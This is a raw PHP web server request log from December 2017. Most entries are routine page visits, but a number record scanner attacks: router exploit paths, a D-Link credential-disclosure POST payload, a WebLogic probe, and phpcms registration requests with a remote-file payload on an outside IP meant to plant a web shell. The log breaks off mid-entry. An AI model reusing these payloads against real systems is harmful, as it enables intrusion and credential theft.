[ 2017-12-22T00:21:26+08:00 ] 172.17.195.153 114.215.45.79 GET /
[ log ] 39.104.48.112:80/ [运行时间：0.024600s][吞吐率：40.65req/s] [内存消耗：2,781.73kb] [文件加载：50]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '39.104.48.112:80',
  'connection' => 'Close',
  'accept-encoding' => 'identity',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
  0 => 'lunbo',
  1 => 'tuijian1',
  2 => 'tuijian2',
  3 => 'tuijian3',
  4 => 'tuijian4',
  5 => 'xilie',
  6 => 'pinzhi1',
  7 => 'pinzhi2',
  8 => 'pinzhi3',
  9 => 'news',
  10 => 'link',
  11 => 'simxilie',
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-22T04:53:39+08:00 ] 172.17.195.153 94.102.49.174 GET http://www.baidu.com/cache/global/img/gs.gif
[ log ] www.baidu.comhttp://www.baidu.com/cache/global/img/gs.gif [运行时间：0.012256s][吞吐率：81.59req/s] [内存消耗：1,508.71kb] [文件加载：37]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'cache',
    1 => 'global',
    2 => 'img',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.baidu.com',
  'user-agent' => 'Mozilla',
  'if-modified-since' => 'Thu, 19 Apr 2012 09:51:20 GMT',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-22T06:17:26+08:00 ] 172.17.195.153 120.132.19.52 GET http://www.qq.com/404/search_children.js
[ log ] www.qq.comhttp://www.qq.com/404/search_children.js [运行时间：0.011276s][吞吐率：88.68req/s] [内存消耗：1,508.88kb] [文件加载：37]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '404',
    1 => 'search_children.js',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.qq.com',
  'accept' => '*/*',
  'pragma' => 'no-cache',
  'user-agent' => 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.114 Safari/537.36',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-22T07:40:34+08:00 ] 172.17.195.153 106.11.227.80 GET /
[ log ] xinchumenye.com/ [运行时间：0.025000s][吞吐率：40.00req/s] [内存消耗：2,782.09kb] [文件加载：50]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'user-agent' => 'Mozilla/5.0 (iPad; CPU OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1',
  'cache-control' => 'no-cache',
  'pragma' => 'no-cache',
  'host' => 'xinchumenye.com',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
  0 => 'lunbo',
  1 => 'tuijian1',
  2 => 'tuijian2',
  3 => 'tuijian3',
  4 => 'tuijian4',
  5 => 'xilie',
  6 => 'pinzhi1',
  7 => 'pinzhi2',
  8 => 'pinzhi3',
  9 => 'news',
  10 => 'link',
  11 => 'simxilie',
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-22T08:31:49+08:00 ] 172.17.195.153 47.93.112.232 GET /
[ log ] 39.104.9.80:80/ [运行时间：0.024332s][吞吐率：41.10req/s] [内存消耗：2,781.59kb] [文件加载：50]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '39.104.9.80:80',
  'connection' => 'Close',
  'accept-encoding' => 'identity',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
  0 => 'lunbo',
  1 => 'tuijian1',
  2 => 'tuijian2',
  3 => 'tuijian3',
  4 => 'tuijian4',
  5 => 'xilie',
  6 => 'pinzhi1',
  7 => 'pinzhi2',
  8 => 'pinzhi3',
  9 => 'news',
  10 => 'link',
  11 => 'simxilie',
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-22T09:38:26+08:00 ] 172.17.195.153 106.11.226.163 GET /
[ log ] www.xinchumenye.com/ [运行时间：0.023721s][吞吐率：42.16req/s] [内存消耗：2,782.41kb] [文件加载：50]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'user-agent' => 'Mozilla/5.0 (iPad; CPU OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1',
  'cache-control' => 'no-cache',
  'pragma' => 'no-cache',
  'host' => 'www.xinchumenye.com',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
  0 => 'lunbo',
  1 => 'tuijian1',
  2 => 'tuijian2',
  3 => 'tuijian3',
  4 => 'tuijian4',
  5 => 'xilie',
  6 => 'pinzhi1',
  7 => 'pinzhi2',
  8 => 'pinzhi3',
  9 => 'news',
  10 => 'link',
  11 => 'simxilie',
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-22T10:04:39+08:00 ] 172.17.195.153 123.7.178.153 GET /favicon.ico
[ log ] www.xinchumenye.com/favicon.ico [运行时间：0.011070s][吞吐率：90.33req/s] [内存消耗：1,509.56kb] [文件加载：37]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'favicon.ico',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.xinchumenye.com',
  'user-agent' => 'Mozilla/5.0 (Windows NT 5.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0',
  'accept' => '*/*',
  'accept-language' => 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
  'accept-encoding' => 'gzip, deflate',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-22T10:04:39+08:00 ] 172.17.195.153 123.7.178.153 GET /favicon.ico
[ log ] xinchumenye.com/favicon.ico [运行时间：0.011511s][吞吐率：86.87req/s] [内存消耗：1,509.37kb] [文件加载：37]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'favicon.ico',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'xinchumenye.com',
  'user-agent' => 'Mozilla/5.0 (Windows NT 5.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'accept-language' => 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
  'accept-encoding' => 'gzip, deflate',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-22T11:23:38+08:00 ] 172.17.195.153 71.6.202.198 GET /ccvv
[ log ] 39.106.4.226/ccvv [运行时间：0.011556s][吞吐率：86.54req/s] [内存消耗：1,508.68kb] [文件加载：37]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'ccvv',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '39.106.4.226',
  'user-agent' => 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64)',
  'accept-encoding' => 'gzip',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-22T11:57:34+08:00 ] 172.17.195.153 179.218.115.128 GET /hndUnblock.cgi
[ log ] 39.106.4.226/hndUnblock.cgi [运行时间：0.011653s][吞吐率：85.82req/s] [内存消耗：1,508.55kb] [文件加载：37]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'hndUnblock.cgi',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept' => '*/*',
  'host' => '39.106.4.226',
  'user-agent' => 'Wget(linux)',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-22T11:57:38+08:00 ] 172.17.195.153 179.218.115.128 GET /tmUnblock.cgi
[ log ] 39.106.4.226/tmUnblock.cgi [运行时间：0.012117s][吞吐率：82.53req/s] [内存消耗：1,508.62kb] [文件加载：37]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'tmUnblock.cgi',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept' => '*/*',
  'host' => '39.106.4.226',
  'user-agent' => 'Wget(linux)',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-22T11:57:43+08:00 ] 172.17.195.153 179.218.115.128 GET /moo
[ log ] 39.106.4.226/moo [运行时间：0.011668s][吞吐率：85.70req/s] [内存消耗：1,508.52kb] [文件加载：37]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'moo',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept' => '*/*',
  'host' => '39.106.4.226',
  'user-agent' => 'Wget(linux)',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-22T11:57:47+08:00 ] 172.17.195.153 179.218.115.128 GET /
[ log ] 39.106.4.226/ [运行时间：0.023506s][吞吐率：42.54req/s] [内存消耗：2,781.81kb] [文件加载：50]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept' => '*/*',
  'host' => '39.106.4.226',
  'user-agent' => 'Wget(linux)',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
  0 => 'lunbo',
  1 => 'tuijian1',
  2 => 'tuijian2',
  3 => 'tuijian3',
  4 => 'tuijian4',
  5 => 'xilie',
  6 => 'pinzhi1',
  7 => 'pinzhi2',
  8 => 'pinzhi3',
  9 => 'news',
  10 => 'link',
  11 => 'simxilie',
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-22T11:57:51+08:00 ] 172.17.195.153 179.218.115.128 POST /getcfg.php
[ log ] 39.106.4.226/getcfg.php [运行时间：0.010871s][吞吐率：91.99req/s] [内存消耗：1,508.39kb] [文件加载：37]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'getcfg.php',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept' => '*/*',
  'cookie' => 'uid=Zd5iHiPget',
  'host' => '39.106.4.226',
  'user-agent' => 'Wget(linux)',
  'content-type' => 'application/x-www-form-urlencoded',
  'content-length' => '60',
)
[ info ] [ PARAM ] array (
  'A' => 'A
_POST_SERVICES=DEVICE.ACCOUNT
AUTHORIZED_GROUP=1',
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-22T11:57:57+08:00 ] 172.17.195.153 179.218.115.128 POST /getcfg.php
[ log ] 39.106.4.226/getcfg.php [运行时间：0.011532s][吞吐率：86.71req/s] [内存消耗：1,508.39kb] [文件加载：37]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'getcfg.php',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept' => '*/*',
  'cookie' => 'uid=Zd5iHiPget',
  'host' => '39.106.4.226',
  'user-agent' => 'Wget(linux)',
  'content-type' => 'application/x-www-form-urlencoded',
  'content-length' => '60',
)
[ info ] [ PARAM ] array (
  'A' => 'A
_POST_SERVICES=DEVICE.ACCOUNT
AUTHORIZED_GROUP=1',
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-22T16:18:57+08:00 ] 172.17.195.153 116.62.176.205 GET /
[ log ] 39.104.15.130:80/ [运行时间：0.023695s][吞吐率：42.20req/s] [内存消耗：2,781.74kb] [文件加载：50]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '39.104.15.130:80',
  'connection' => 'Close',
  'accept-encoding' => 'identity',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
  0 => 'lunbo',
  1 => 'tuijian1',
  2 => 'tuijian2',
  3 => 'tuijian3',
  4 => 'tuijian4',
  5 => 'xilie',
  6 => 'pinzhi1',
  7 => 'pinzhi2',
  8 => 'pinzhi3',
  9 => 'news',
  10 => 'link',
  11 => 'simxilie',
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-22T16:35:10+08:00 ] 172.17.195.153 140.205.225.190 POST /index.php?m=member&c=index&a=register&siteid=1
[ log ] xinchumenye.com:80/index.php?m=member&c=index&a=register&siteid=1 [运行时间：0.024175s][吞吐率：41.37req/s] [内存消耗：2,784.02kb] [文件加载：50]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'identity',
  'host' => 'xinchumenye.com:80',
  'connection' => 'close',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6577126.phpcmsv9-register-upload)',
  'content-type' => 'application/x-www-form-urlencoded',
  'content-length' => '171',
)
[ info ] [ PARAM ] array (
  'm' => 'member',
  'c' => 'index',
  'a' => 'register',
  'siteid' => '1',
  'modelid' => '11',
  'username' => 'TLfadcUy',
  'password' => 'TLfadcUy',
  'email' => 'TLfadcUy@aliyun.com',
  'info' => 
  array (
    'content' => '&lt;img src=http://120.26.55.211/s.txt?.php#.jpg&gt;',
  ),
  'dosubmit' => '1',
  'protocol' => '',
)
[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
  0 => 'lunbo',
  1 => 'tuijian1',
  2 => 'tuijian2',
  3 => 'tuijian3',
  4 => 'tuijian4',
  5 => 'xilie',
  6 => 'pinzhi1',
  7 => 'pinzhi2',
  8 => 'pinzhi3',
  9 => 'news',
  10 => 'link',
  11 => 'simxilie',
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-22T16:35:15+08:00 ] 172.17.195.153 140.205.225.190 GET /index.php?m=wap&a=index&siteid=1
[ log ] xinchumenye.com:80/index.php?m=wap&a=index&siteid=1 [运行时间：0.025507s][吞吐率：39.20req/s] [内存消耗：2,782.85kb] [文件加载：50]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'identity',
  'host' => 'xinchumenye.com:80',
  'connection' => 'close',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6577126.phpcmsv9-attachment-sql)',
)
[ info ] [ PARAM ] array (
  'm' => 'wap',
  'a' => 'index',
  'siteid' => '1',
)
[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
  0 => 'lunbo',
  1 => 'tuijian1',
  2 => 'tuijian2',
  3 => 'tuijian3',
  4 => 'tuijian4',
  5 => 'xilie',
  6 => 'pinzhi1',
  7 => 'pinzhi2',
  8 => 'pinzhi3',
  9 => 'news',
  10 => 'link',
  11 => 'simxilie',
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-22T17:29:14+08:00 ] 172.17.195.153 139.162.88.63 GET http://clientapi.ipip.net/echo.php?info=1234567890
[ log ] clientapi.ipip.nethttp://clientapi.ipip.net/echo.php?info=1234567890 [运行时间：0.011800s][吞吐率：84.75req/s] [内存消耗：1,509.29kb] [文件加载：37]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'echo.php',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'clientapi.ipip.net',
  'user-agent' => 'Go-http-client/1.1',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
  'info' => '1234567890',
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-22T19:40:33+08:00 ] 172.17.195.153 183.129.160.229 GET /wls-wsat/CoordinatorPortType
[ log ] 39.106.4.226:80/wls-wsat/CoordinatorPortType [运行时间：0.011291s][吞吐率：88.57req/s] [内存消耗：1,509.26kb] [文件加载：37]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'wls-wsat',
    1 => 'CoordinatorPortType',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '39.106.4.226:80',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'accept-language' => 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-22T19:55:15+08:00 ] 172.17.195.153 115.231.222.195 GET /agent/pub/login.html
[ log ] wx.hunan5188.com/agent/pub/login.html [运行时间：0.010917s][吞吐率：91.60req/s] [内存消耗：1,509.64kb] [文件加载：37]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'agent',
    1 => 'pub',
    2 => 'login',
  ),
)
[ info ] [ HEADER ] array (
  'accept' => 'application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*',
  'accept-language' => 'zh-cn',
  'ua-cpu' => 'x86',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1)',
  'host' => 'wx.hunan5188.com',
  'connection' => 'Keep-Alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-22T20:20:57+08:00 ] 172.17.195.153 140.205.225.187 POST /index.php?m=member&c=index&a=register&siteid=1
[ log ] www.xinchumenye.com:80/index.php?m=member&c=index&a=register&siteid=1 [运行时间：0.024246s][吞吐率：41.24req/s] [内存消耗：2,784.05kb] [文件加载：50]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'identity',
  'host' => 'www.xinchumenye.com:80',
  'connection' => 'close',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6577126.phpcmsv9-register-upload)',
  'content-type' => 'application/x-www-form-urlencoded',
  'content-length' => '171',
)
[ info ] [ PARAM ] array (
  'm' => 'member',
  'c' => 'index',
  'a' => 'register',
  'siteid' => '1',
  'modelid' => '11',
  'username' => 'PxXGtLUB',
  'password' => 'PxXGtLUB',
  'email' => 'PxXGtLUB@aliyun.com',
  'info' => 
  array (
    'content' => '&lt;img src=http://120.26.55.211/s.txt?.php#.jpg&gt;',
  ),
  'dosubmit' => '1',
  'protocol' => '',
)
[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
  0 => 'lunbo',
  1 => 'tuijian1',
  2 => 'tuijian2',
  3 => 'tuijian3',
  4 => 'tuijian4',
  5 => 'xilie',
  6 => 'pinzhi1',
  7 => 'pinzhi2',
  8 => 'pinzhi3',
  9 => 'news',
  10 => 'link',
  11 => 'simxilie',
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-22T20:20:58+08:00 ] 172.17.195.153 140.205.225.187 GET /index.php?m=wap&a=index&siteid=1
[ log ] www.xinchumenye.com:80/index.php?m=wap&a=index&siteid=1 [运行时间：0.024140s][吞吐率：41.42req/s] [内存消耗：2,782.70kb] [文件加载：50]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'identity',
  'host' => 'www.xinchumenye.com:80',
  'connection' => 'close',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6577126.phpcmsv9-attachment-sql)',
)
[ info ] [ PARAM ] array (
  'm' => 'wap',
  'a' => 'index',
  'siteid' => '1',
)
[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
  0 => 'lunbo',
  1 => 'tuijian1',
  2 => 'tuijian2',
  3 => 'tuijian3',
  4 => 'tuijian4',
  5 => 'xilie',
  6 => 'pinzhi1',
  7 => 'pinzhi2',
  8 => 'pinzhi3',
  9 => 'news',
  10 => 'link',
  11 => 'simxilie',
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-22T20:26:06+08:00 ] 172.17.195.153 106.11.231.218 GET /
[ log ] 39.106.4.226/ [运行时间：0.024564s][吞吐率：40.71req/s] [内存消耗：2,781.94kb] [文件加载：50]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378.p)',
  'host' => '39.106.4.226',
  'referer' => 'http://39.106.4.226/',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'accept-encoding' => 'gzip,deflate',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
  0 => 'lunbo',
  1 => 'tuijian1',
  2 => 'tuijian2',
  3 => 'tuijian3',
  4 => 'tuijian4',
  5 => 'xilie',
  6 => 'pinzhi1',
  7 => 'pinzhi2',
  8 => 'pinzhi3',
  9 => 'news',
  10 => 'link',
  11 => 'simxilie',
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-22T20:26:10+08:00 ] 172.17.195.153 106.11.229.134 GET /rs-status
[ log ] 39.106.4.226:80/rs-status [运行时间：0.011526s][吞吐率：86.76req/s] [内存消耗：1,508.94kb] [文件加载：37]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'rs-status',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://39.106.4.226/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
  'host' => '39.106.4.226:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-22T20:26:10+08:00 ] 172.17.195.153 106.11.229.134 GET /ganglia/index.php
[ log ] 39.106.4.226:80/ganglia/index.php [运行时间：0.010944s][吞吐率：91.37req/s] [内存消耗：1,509.27kb] [文件加载：37]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'ganglia',
    1 => 'index.php',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://39.106.4.226/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
  'host' => '39.106.4.226:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-22T20:26:10+08:00 ] 172.17.195.153 106.11.229.134 GET /index.php
[ log ] 39.106.4.226:80/index.php [运行时间：0.023593s][吞吐率：42.39req/s] [内存消耗：2,782.26kb] [文件加载：50]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://39.106.4.226/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
  'host' => '39.106.4.226:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
  0 => 'lunbo',
  1 => 'tuijian1',
  2 => 'tuijian2',
  3 => 'tuijian3',
  4 => 'tuijian4',
  5 => 'xilie',
  6 => 'pinzhi1',
  7 => 'pinzhi2',
  8 => 'pinzhi3',
  9 => 'news',
  10 => 'link',
  11 => 'simxilie',
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-22T20:26:14+08:00 ] 172.17.195.153 106.11.229.134 GET /jobs/
[ log ] 39.106.4.226:80/jobs/ [运行时间：0.011488s][吞吐率：87.05req/s] [内存消耗：1,508.91kb] [文件加载：37]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'jobs',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://39.106.4.226/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
